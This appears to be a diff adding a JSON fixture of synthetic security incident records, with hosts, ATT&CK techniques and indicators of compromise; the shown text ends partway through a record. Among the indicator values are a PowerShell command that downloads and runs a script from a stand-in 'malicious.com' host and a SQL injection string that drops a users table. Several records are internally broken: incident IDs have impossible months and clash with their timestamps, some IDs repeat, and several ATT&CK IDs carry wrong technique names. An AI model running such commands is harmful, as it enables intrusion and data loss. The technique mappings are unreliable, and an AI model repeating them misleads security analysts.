@@ -1,0 +1,1454 @@
+[
+    {
+        "incident_id": "INC-2024-01-15-001",
+        "title": "Phishing Campaign Targeting Financial Services",
+        "description": "Sophisticated phishing campaign detected targeting employees of multiple financial institutions through email impersonation.",
+        "initial_findings": "Emails contain malicious links disguised as password reset notifications from a fake internal IT support portal.",
+        "timestamp": "2024-01-15T09:23:41Z",
+        "affected_assets": [
+            {
+                "hostname": "FIN-WORKSTATION-023",
+                "ip_address": "192.168.45.112",
+                "os": "Windows 10 Enterprise",
+                "installed_software": [
+                    {"name": "Microsoft Office", "version": "2021"},
+                    {"name": "Google Chrome", "version": "120.0.6099.110"}
+                ]
+            },
+            {
+                "hostname": "FIN-LAPTOP-056",
+                "ip_address": "192.168.45.213", 
+                "os": "Windows 11 Pro",
+                "installed_software": [
+                    {"name": "Microsoft Outlook", "version": "16.0"},
+                    {"name": "Firefox", "version": "121.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1566.001",
+                "name": "Phishing: Spear Phishing Attachment",
+                "description": "Attackers sent targeted emails with malicious attachments"
+            },
+            {
+                "id": "T1078",
+                "name": "Valid Accounts",
+                "description": "Potential attempt to use compromised credentials"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "C:\\Users\\user\\Downloads\\IT_Support_Reset.exe",
+                "description": "Malicious executable disguised as IT support tool"
+            },
+            {
+                "type": "process_name", 
+                "value": "IT_Support_Reset.exe",
+                "description": "Suspicious process mimicking IT support"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-02-22-002", 
+        "title": "Cloud Infrastructure Unauthorized Access",
+        "description": "Detected unauthorized access and potential data exfiltration from AWS cloud environment.",
+        "initial_findings": "Multiple API calls from unusual geographic locations detected outside of normal business hours.",
+        "timestamp": "2024-02-22T14:45:22Z",
+        "affected_assets": [
+            {
+                "hostname": "AWS-PROD-APP-01",
+                "ip_address": "10.0.1.45",
+                "os": "Amazon Linux 2",
+                "installed_software": [
+                    {"name": "Docker", "version": "20.10.23"},
+                    {"name": "Kubernetes", "version": "1.27.3"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1078.004",
+                "name": "Valid Accounts: Cloud Accounts",
+                "description": "Unauthorized access to cloud infrastructure"
+            },
+            {
+                "id": "T1530",
+                "name": "Data Transfer",
+                "description": "Potential unauthorized data movement"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "container_id",
+                "value": "a1b2c3d4e5f6",
+                "description": "Suspicious container with unexpected network activity"
+            },
+            {
+                "type": "library_name",
+                "value": "boto3-exfil-mod",
+                "description": "Potential custom exfiltration library"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-03-10-003",
+        "title": "Industrial Control System Reconnaissance",
+        "description": "Detected potential reconnaissance activities targeting industrial control systems in manufacturing facility.",
+        "initial_findings": "Unusual network scanning and probing of SCADA systems from external IP addresses.",
+        "timestamp": "2024-03-10T07:12:33Z", 
+        "affected_assets": [
+            {
+                "hostname": "SCADA-PLC-LINE3",
+                "ip_address": "172.16.22.88",
+                "os": "Embedded RTOS",
+                "installed_software": [
+                    {"name": "Siemens WinCC", "version": "7.5"},
+                    {"name": "Modbus TCP", "version": "1.1b"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1595.001",
+                "name": "Active Scanning: Scanning IP Blocks",
+                "description": "Systematic scanning of network infrastructure"
+            },
+            {
+                "id": "T1046",
+                "name": "Network Service Scanning",
+                "description": "Probing of network services and protocols"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_extension",
+                "value": ".plcscan",
+                "description": "Custom file extension associated with ICS scanning tools"
+            },
+            {
+                "type": "process_name",
+                "value": "industrial_mapper.exe",
+                "description": "Potential reconnaissance tool"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-04-05-004",
+        "title": "Mobile Device Malware Infection",
+        "description": "Detected sophisticated mobile malware targeting corporate mobile devices through third-party app store.",
+        "initial_findings": "Multiple Android devices showing signs of unauthorized data access and communication with command and control servers.",
+        "timestamp": "2024-04-05T16:37:49Z",
+        "affected_assets": [
+            {
+                "hostname": "MOBILE-DEV-023",
+                "ip_address": "192.168.1.201",
+                "os": "Android 13",
+                "installed_software": [
+                    {"name": "Samsung Knox", "version": "3.4"},
+                    {"name": "Google Play Protect", "version": "2023.12"}
+                ]
+            },
+            {
+                "hostname": "MOBILE-DEV-045",
+                "ip_address": "192.168.1.202",
+                "os": "Android 12",
+                "installed_software": [
+                    {"name": "Samsung Knox", "version": "3.2"},
+                    {"name": "Google Play Protect", "version": "2023.10"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1618",
+                "name": "Compromise Client Software Binary",
+                "description": "Malicious modification of mobile application"
+            },
+            {
+                "id": "T1533",
+                "name": "Data from Local System",
+                "description": "Unauthorized access to device data"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "/data/app/com.malicious.trojan/base.apk",
+                "description": "Malicious Android application package"
+            },
+            {
+                "type": "process_name",
+                "value": "system_service_helper",
+                "description": "Suspicious background process"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-05-12-005",
+        "title": "Ransomware Attack on Healthcare Network",
+        "description": "Critical ransomware infection spreading across hospital network, encrypting patient records and medical systems.",
+        "initial_findings": "Multiple Windows servers showing signs of encryption, with ransom note detected on primary file servers.",
+        "timestamp": "2024-05-12T03:45:22Z",
+        "affected_assets": [
+            {
+                "hostname": "HOSP-FILE-SRV-01",
+                "ip_address": "10.20.30.41",
+                "os": "Windows Server 2019",
+                "installed_software": [
+                    {"name": "Epic EMR", "version": "2023.1"},
+                    {"name": "Microsoft SQL Server", "version": "2019"}
+                ]
+            },
+            {
+                "hostname": "HOSP-DC-02",
+                "ip_address": "10.20.30.22",
+                "os": "Windows Server 2019",
+                "installed_software": [
+                    {"name": "Active Directory", "version": "2019"},
+                    {"name": "SCCM", "version": "2103"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1486",
+                "name": "Data Encrypted for Impact",
+                "description": "Systematic encryption of critical systems"
+            },
+            {
+                "id": "T1021",
+                "name": "Remote Services",
+                "description": "Lateral movement across network"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "C:\\RANSOM_NOTE.txt",
+                "description": "Ransomware ransom note"
+            },
+            {
+                "type": "file_extension",
+                "value": ".locked",
+                "description": "Encrypted file extension"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-06-18-006",
+        "title": "Supply Chain Software Compromise",
+        "description": "Detected malicious code injection in widely-used third-party software development toolkit.",
+        "initial_findings": "Multiple development environments showing unexpected network connections and suspicious compilation artifacts.",
+        "timestamp": "2024-06-18T11:22:33Z",
+        "affected_assets": [
+            {
+                "hostname": "DEV-BUILD-SRV-03",
+                "ip_address": "192.168.100.55",
+                "os": "Ubuntu 22.04 LTS",
+                "installed_software": [
+                    {"name": "Jenkins", "version": "2.414.1"},
+                    {"name": "Docker", "version": "24.0.2"},
+                    {"name": "Git", "version": "2.41.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1195.002",
+                "name": "Supply Chain Compromise: Compromise Software Dependencies",
+                "description": "Malicious code inserted into software build process"
+            },
+            {
+                "id": "T1554",
+                "name": "Compromise Client Software Binary",
+                "description": "Modification of compiled software packages"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "library_name",
+                "value": "compromised_build_utils",
+                "description": "Malicious build utility library"
+            },
+            {
+                "type": "process_name",
+                "value": "shadow_compiler",
+                "description": "Unauthorized compilation process"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-22-007",
+        "title": "Advanced Persistent Threat in Research Network",
+        "description": "Sophisticated nation-state level cyber espionage targeting scientific research infrastructure.",
+        "initial_findings": "Persistent network backdoors and advanced data exfiltration mechanisms discovered in high-performance computing cluster.",
+        "timestamp": "2024-07-22T16:55:12Z",
+        "affected_assets": [
+            {
+                "hostname": "RESEARCH-HPC-NODE-17",
+                "ip_address": "10.50.100.217",
+                "os": "CentOS Linux 8",
+                "installed_software": [
+                    {"name": "SLURM", "version": "21.08.6"},
+                    {"name": "OpenMPI", "version": "4.1.2"},
+                    {"name": "Singularity", "version": "3.9.5"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1041",
+                "name": "Exfiltration Over C2 Channel",
+                "description": "Data stolen through command and control infrastructure"
+            },
+            {
+                "id": "T1562.001",
+                "name": "Impair Defenses: Disable or Modify Tools",
+                "description": "Attempts to disable security monitoring"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "library_name",
+                "value": "hidden_exfil_module",
+                "description": "Covert data exfiltration library"
+            },
+            {
+                "type": "process_name",
+                "value": "research_daemon",
+                "description": "Unauthorized background process"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-08-03-008",
+        "title": "Critical Infrastructure IoT Botnet Infiltration",
+        "description": "Large-scale botnet compromise of industrial IoT devices in power distribution network.",
+        "initial_findings": "Hundreds of smart meters and grid sensors showing synchronized malicious network behavior.",
+        "timestamp": "2024-08-03T02:17:45Z",
+        "affected_assets": [
+            {
+                "hostname": "GRID-SMARTMETER-4522",
+                "ip_address": "192.168.200.122",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "OpenWrt", "version": "22.03.3"},
+                    {"name": "MQTT Client", "version": "1.6.12"}
+                ]
+            },
+            {
+                "hostname": "GRID-SENSOR-7811",
+                "ip_address": "192.168.200.223",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "OpenWrt", "version": "22.03.3"},
+                    {"name": "Modbus TCP", "version": "1.2"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1595.001",
+                "name": "Active Scanning: Scanning IP Blocks",
+                "description": "Systematic scanning of network infrastructure"
+            },
+            {
+                "id": "T1496",
+                "name": "Resource Hijacking",
+                "description": "Unauthorized use of computing resources"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "iot_botnet_agent",
+                "description": "Malicious IoT botnet process"
+            },
+            {
+                "type": "file_extension",
+                "value": ".botnet_config",
+                "description": "Configuration file for IoT botnet"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-09-15-009",
+        "title": "Financial Trading Platform Zero-Day Exploit",
+        "description": "Critical zero-day vulnerability discovered in high-frequency trading platform, potentially allowing market manipulation.",
+        "initial_findings": "Unusual trading patterns and unauthorized API access detected in multiple financial institutions.",
+        "timestamp": "2024-09-15T10:33:56Z",
+        "affected_assets": [
+            {
+                "hostname": "TRADE-APP-SRV-01",
+                "ip_address": "10.10.20.45",
+                "os": "Red Hat Enterprise Linux 8.7",
+                "installed_software": [
+                    {"name": "Java", "version": "17.0.8"},
+                    {"name": "Apache Tomcat", "version": "10.1.13"},
+                    {"name": "PostgreSQL", "version": "15.4"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1068",
+                "name": "Exploitation for Privilege Escalation",
+                "description": "Leveraging unknown software vulnerability"
+            },
+            {
+                "id": "T1570",
+                "name": "Lateral Movement",
+                "description": "Movement between different trading platform instances"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "library_name",
+                "value": "zero_day_exploit_lib",
+                "description": "Malicious library exploiting platform vulnerability"
+            },
+            {
+                "type": "process_name",
+                "value": "market_manipulator",
+                "description": "Unauthorized trading process"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-10-20-010",
+        "title": "Automotive Manufacturing Control System Breach",
+        "description": "Sophisticated cyber attack targeting industrial control systems in automotive production line.",
+        "initial_findings": "Unauthorized modifications to robotic assembly line programming detected, potential sabotage attempt.",
+        "timestamp": "2024-10-20T08:45:33Z",
+        "affected_assets": [
+            {
+                "hostname": "ROBOT-ARM-WELD-03",
+                "ip_address": "172.16.50.88",
+                "os": "Real-Time Operating System",
+                "installed_software": [
+                    {"name": "Siemens Sinumerik", "version": "840D sl"},
+                    {"name": "Industrial Ethernet", "version": "PROFINET"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1562.001",
+                "name": "Impair Defenses: Disable or Modify Tools",
+                "description": "Attempts to modify industrial control system configurations"
+            },
+            {
+                "id": "T1609",
+                "name": "Container Administration Command",
+                "description": "Unauthorized container manipulation"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "rogue_controller",
+                "description": "Unauthorized control process"
+            },
+            {
+                "type": "file_extension",
+                "value": ".malicious_config",
+                "description": "Suspicious configuration file"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-11-05-011",
+        "title": "Healthcare Learning Management System Data Leak",
+        "description": "Misconfigured cloud storage exposed sensitive medical training records and personal information.",
+        "initial_findings": "Publicly accessible cloud bucket discovered with unencrypted medical training documents and student records.",
+        "timestamp": "2024-11-05T14:22:11Z",
+        "affected_assets": [
+            {
+                "hostname": "CLOUD-LMS-STORAGE-01",
+                "ip_address": "10.30.40.55",
+                "os": "Amazon Linux 2",
+                "installed_software": [
+                    {"name": "AWS S3", "version": "Latest"},
+                    {"name": "Nginx", "version": "1.22.1"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1530",
+                "name": "Data from Cloud Storage",
+                "description": "Unauthorized access to cloud-stored data"
+            },
+            {
+                "id": "T1552.001",
+                "name": "Unsecured Credentials: Credentials In Files",
+                "description": "Sensitive information exposed in configuration files"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "/public/medical_records/",
+                "description": "Publicly accessible sensitive document directory"
+            },
+            {
+                "type": "library_name",
+                "value": "unprotected_storage_lib",
+                "description": "Misconfigured cloud storage library"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-12-12-012",
+        "title": "Telecommunications Network DNS Hijacking",
+        "description": "Large-scale DNS hijacking attack redirecting customer internet traffic through malicious servers.",
+        "initial_findings": "Widespread DNS resolution anomalies detected across multiple network segments.",
+        "timestamp": "2024-12-12T03:56:44Z",
+        "affected_assets": [
+            {
+                "hostname": "CORE-ROUTER-BGP-01",
+                "ip_address": "203.0.113.10",
+                "os": "Cisco IOS XR",
+                "installed_software": [
+                    {"name": "BGP", "version": "4"},
+                    {"name": "BIND DNS", "version": "9.18.12"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1573",
+                "name": "Encrypted Channel",
+                "description": "Malicious traffic disguised through encryption"
+            },
+            {
+                "id": "T1071.001",
+                "name": "Application Layer Protocol: Web Protocols",
+                "description": "Using HTTP/HTTPS for command and control"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "dns_redirect_agent",
+                "description": "Malicious DNS redirection process"
+            },
+            {
+                "type": "file_extension",
+                "value": ".dns_hijack_config",
+                "description": "Configuration for DNS manipulation"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-13-01-013",
+        "title": "Aerospace Defense Contractor Network Intrusion",
+        "description": "Sophisticated cyber espionage targeting sensitive military technology research networks.",
+        "initial_findings": "Advanced persistent threat group discovered with deep network penetration and data exfiltration mechanisms.",
+        "timestamp": "2024-01-13T19:44:22Z",
+        "affected_assets": [
+            {
+                "hostname": "RESEARCH-SRV-CLASSIFIED-02",
+                "ip_address": "10.75.200.88",
+                "os": "Hardened Red Hat Enterprise Linux 8.5",
+                "installed_software": [
+                    {"name": "Secure Compartmented Network", "version": "4.2"},
+                    {"name": "Encrypted Communication Suite", "version": "3.1"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1059.004",
+                "name": "Command and Scripting Interpreter: Unix Shell",
+                "description": "Advanced shell-based infiltration techniques"
+            },
+            {
+                "id": "T1041",
+                "name": "Exfiltration Over C2 Channel",
+                "description": "Covert data extraction through command and control infrastructure"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "library_name",
+                "value": "stealth_exfil_module",
+                "description": "Sophisticated data extraction library"
+            },
+            {
+                "type": "process_name",
+                "value": "ghost_agent",
+                "description": "Undetected background infiltration process"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-14-02-014",
+        "title": "E-Commerce Platform Payment System Breach",
+        "description": "Critical vulnerability in payment processing system allowing unauthorized financial transactions.",
+        "initial_findings": "Detected multiple fraudulent transactions bypassing standard payment verification mechanisms.",
+        "timestamp": "2024-02-14T11:33:45Z",
+        "affected_assets": [
+            {
+                "hostname": "PAYMENT-GW-PROD-01",
+                "ip_address": "192.168.75.44",
+                "os": "Ubuntu Server 22.04 LTS",
+                "installed_software": [
+                    {"name": "Nginx", "version": "1.22.1"},
+                    {"name": "PostgreSQL", "version": "15.3"},
+                    {"name": "Python", "version": "3.10.6"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1068",
+                "name": "Exploitation for Privilege Escalation",
+                "description": "Leveraging payment system vulnerability"
+            },
+            {
+                "id": "T1570",
+                "name": "Lateral Movement",
+                "description": "Unauthorized access across payment processing systems"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "payment_bypass_agent",
+                "description": "Unauthorized transaction processing mechanism"
+            },
+            {
+                "type": "library_name",
+                "value": "fraudulent_transaction_lib",
+                "description": "Malicious library manipulating payment flows"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-15-03-015",
+        "title": "Smart City Infrastructure IoT Botnet Infiltration",
+        "description": "Large-scale compromise of municipal IoT devices controlling traffic management and public utilities.",
+        "initial_findings": "Synchronized malicious control of traffic lights, surveillance systems, and environmental sensors.",
+        "timestamp": "2024-03-15T06:22:11Z",
+        "affected_assets": [
+            {
+                "hostname": "TRAFFIC-CONTROL-NODE-22",
+                "ip_address": "10.20.30.155",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "OpenWrt", "version": "22.03.5"},
+                    {"name": "MQTT Broker", "version": "2.0.15"}
+                ]
+            },
+            {
+                "hostname": "ENVIRONMENTAL-SENSOR-47",
+                "ip_address": "10.20.30.156",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "OpenWrt", "version": "22.03.5"},
+                    {"name": "Sensor Management Suite", "version": "3.1.2"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1496",
+                "name": "Resource Hijacking",
+                "description": "Unauthorized use of IoT device computing resources"
+            },
+            {
+                "id": "T1562.001",
+                "name": "Impair Defenses: Disable or Modify Tools",
+                "description": "Attempts to compromise municipal infrastructure monitoring"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "iot_botnet_controller",
+                "description": "Malicious process controlling compromised devices"
+            },
+            {
+                "type": "file_extension",
+                "value": ".botnet_config",
+                "description": "Configuration for coordinated IoT device manipulation"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-01-007",
+        "title": "Zero-Day Exploit in Web Application Framework",
+        "description": "Critical zero-day vulnerability exploited in widely-used web application framework, leading to unauthorized access.",
+        "initial_findings": "Multiple web servers compromised through sophisticated exploit chain.",
+        "timestamp": "2024-07-01T08:15:22Z",
+        "affected_assets": [
+            {
+                "hostname": "WEB-APP-SRV-01",
+                "ip_address": "10.0.0.10",
+                "os": "Ubuntu 22.04 LTS",
+                "installed_software": [
+                    {"name": "Django", "version": "4.2.0"},
+                    {"name": "Nginx", "version": "1.18.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1190",
+                "name": "Exploit Public-Facing Application",
+                "description": "Zero-day exploit in web framework"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "http_request",
+                "value": "POST /api/v1/exploit",
+                "description": "Malicious API request pattern"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-02-008",
+        "title": "Insider Threat Data Exfiltration",
+        "description": "Detected unauthorized data access and exfiltration by privileged user.",
+        "initial_findings": "Unusual data access patterns and large file transfers to external storage.",
+        "timestamp": "2024-07-02T14:30:00Z",
+        "affected_assets": [
+            {
+                "hostname": "ADMIN-WORKSTATION-01",
+                "ip_address": "192.168.1.100",
+                "os": "Windows 11 Pro",
+                "installed_software": [
+                    {"name": "Microsoft Office", "version": "2021"},
+                    {"name": "7-Zip", "version": "23.01"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1078",
+                "name": "Valid Accounts",
+                "description": "Privileged account misuse"
+            },
+            {
+                "id": "T1048",
+                "name": "Exfiltration Over Alternative Protocol",
+                "description": "Data exfiltration via cloud storage"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "C:\\Users\\admin\\Downloads\\sensitive_data.zip",
+                "description": "Compressed sensitive data"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-03-009",
+        "title": "IoT Device Botnet Recruitment",
+        "description": "Multiple IoT devices compromised and recruited into botnet for DDoS attacks.",
+        "initial_findings": "Unusual network traffic patterns and device behavior changes.",
+        "timestamp": "2024-07-03T09:45:12Z",
+        "affected_assets": [
+            {
+                "hostname": "IOT-CAMERA-01",
+                "ip_address": "192.168.2.50",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "Camera Firmware", "version": "2.1.0"},
+                    {"name": "Network Stack", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1078.003",
+                "name": "Valid Accounts: Local Accounts",
+                "description": "Default credential exploitation"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "network_traffic",
+                "value": "UDP flood to 8.8.8.8",
+                "description": "DDoS attack traffic"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-04-010",
+        "title": "Cryptocurrency Mining Malware",
+        "description": "Unauthorized cryptocurrency mining software detected on multiple servers.",
+        "initial_findings": "High CPU usage and suspicious network connections to mining pools.",
+        "timestamp": "2024-07-04T16:20:33Z",
+        "affected_assets": [
+            {
+                "hostname": "PROD-SRV-01",
+                "ip_address": "10.0.0.20",
+                "os": "CentOS 8",
+                "installed_software": [
+                    {"name": "Apache", "version": "2.4.46"},
+                    {"name": "MySQL", "version": "8.0.26"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1496",
+                "name": "Resource Hijacking",
+                "description": "Cryptocurrency mining"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "xmrig",
+                "description": "Cryptocurrency mining software"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-05-011",
+        "title": "API Key Compromise",
+        "description": "Unauthorized use of API keys for cloud service access.",
+        "initial_findings": "Unusual API usage patterns and unexpected resource creation.",
+        "timestamp": "2024-07-05T11:05:44Z",
+        "affected_assets": [
+            {
+                "hostname": "API-GATEWAY-01",
+                "ip_address": "10.0.0.30",
+                "os": "Amazon Linux 2",
+                "installed_software": [
+                    {"name": "API Gateway", "version": "1.0"},
+                    {"name": "AWS SDK", "version": "2.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1552",
+                "name": "Unsecured Credentials",
+                "description": "API key exposure"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "api_key",
+                "value": "AKIAXXXXXXXXXXXXXXXX",
+                "description": "Compromised AWS API key"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-06-012",
+        "title": "DNS Tunneling Attempt",
+        "description": "Detected DNS tunneling activity for data exfiltration.",
+        "initial_findings": "Unusual DNS query patterns and large volume of DNS requests.",
+        "timestamp": "2024-07-06T13:40:55Z",
+        "affected_assets": [
+            {
+                "hostname": "DNS-SRV-01",
+                "ip_address": "10.0.0.40",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "BIND", "version": "9.16.1"},
+                    {"name": "DNS Tools", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1071.004",
+                "name": "Application Layer Protocol: DNS",
+                "description": "DNS tunneling"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "dns_query",
+                "value": "*.malicious-domain.com",
+                "description": "Suspicious DNS queries"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-07-013",
+        "title": "Privilege Escalation via Kernel Exploit",
+        "description": "Attempted privilege escalation using kernel vulnerability.",
+        "initial_findings": "Suspicious system calls and kernel module loading attempts.",
+        "timestamp": "2024-07-07T15:25:06Z",
+        "affected_assets": [
+            {
+                "hostname": "LINUX-SRV-01",
+                "ip_address": "10.0.0.50",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Linux Kernel", "version": "5.4.0"},
+                    {"name": "System Tools", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1068",
+                "name": "Exploitation for Privilege Escalation",
+                "description": "Kernel exploit attempt"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "process_name",
+                "value": "exploit_kernel",
+                "description": "Kernel exploit binary"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-08-014",
+        "title": "Social Engineering Attack",
+        "description": "Successful social engineering attack leading to unauthorized access.",
+        "initial_findings": "Employee credentials compromised through phishing.",
+        "timestamp": "2024-07-08T10:15:27Z",
+        "affected_assets": [
+            {
+                "hostname": "USER-WORKSTATION-01",
+                "ip_address": "192.168.1.150",
+                "os": "Windows 10 Pro",
+                "installed_software": [
+                    {"name": "Microsoft Office", "version": "2021"},
+                    {"name": "Chrome", "version": "91.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1566",
+                "name": "Phishing",
+                "description": "Social engineering"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "email_address",
+                "value": "fake_support@company.com",
+                "description": "Phishing email sender"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-09-015",
+        "title": "Container Escape Attempt",
+        "description": "Attempted escape from containerized environment to host system.",
+        "initial_findings": "Suspicious system calls and host resource access attempts.",
+        "timestamp": "2024-07-09T14:50:38Z",
+        "affected_assets": [
+            {
+                "hostname": "DOCKER-HOST-01",
+                "ip_address": "10.0.0.60",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Docker", "version": "20.10.7"},
+                    {"name": "Kubernetes", "version": "1.21.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1611",
+                "name": "Escape to Host",
+                "description": "Container escape attempt"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "container_id",
+                "value": "abc123def456",
+                "description": "Compromised container"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-10-016",
+        "title": "Wireless Network Attack",
+        "description": "Attempted man-in-the-middle attack on corporate wireless network.",
+        "initial_findings": "Rogue access point detected and suspicious ARP traffic.",
+        "timestamp": "2024-07-10T09:35:49Z",
+        "affected_assets": [
+            {
+                "hostname": "WIFI-AP-01",
+                "ip_address": "192.168.1.200",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "Wireless Firmware", "version": "2.0"},
+                    {"name": "Network Stack", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1557",
+                "name": "Adversary-in-the-Middle",
+                "description": "Wireless network attack"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "mac_address",
+                "value": "00:11:22:33:44:55",
+                "description": "Rogue access point MAC"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-11-017",
+        "title": "Database Injection Attack",
+        "description": "SQL injection attempt on web application database.",
+        "initial_findings": "Malicious SQL queries detected in web application logs.",
+        "timestamp": "2024-07-11T16:10:50Z",
+        "affected_assets": [
+            {
+                "hostname": "DB-SRV-01",
+                "ip_address": "10.0.0.70",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "PostgreSQL", "version": "13.3"},
+                    {"name": "Web Application", "version": "2.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1190",
+                "name": "Exploit Public-Facing Application",
+                "description": "SQL injection"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "sql_query",
+                "value": "SELECT * FROM users; DROP TABLE users;",
+                "description": "Malicious SQL query"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-12-018",
+        "title": "Fileless Malware Execution",
+        "description": "Fileless malware detected using PowerShell for execution.",
+        "initial_findings": "Suspicious PowerShell commands and memory-only execution.",
+        "timestamp": "2024-07-12T11:45:01Z",
+        "affected_assets": [
+            {
+                "hostname": "WIN-SRV-01",
+                "ip_address": "192.168.1.250",
+                "os": "Windows Server 2019",
+                "installed_software": [
+                    {"name": "PowerShell", "version": "5.1"},
+                    {"name": "Windows Defender", "version": "4.18.2107.4"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1059.001",
+                "name": "Command and Scripting Interpreter: PowerShell",
+                "description": "Fileless malware execution"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "powershell_command",
+                "value": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')",
+                "description": "Malicious PowerShell command"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-13-019",
+        "title": "Cloud Storage Misconfiguration",
+        "description": "Publicly accessible cloud storage bucket containing sensitive data.",
+        "initial_findings": "Unauthorized access to cloud storage resources.",
+        "timestamp": "2024-07-13T13:20:12Z",
+        "affected_assets": [
+            {
+                "hostname": "S3-BUCKET-01",
+                "ip_address": "N/A",
+                "os": "N/A",
+                "installed_software": [
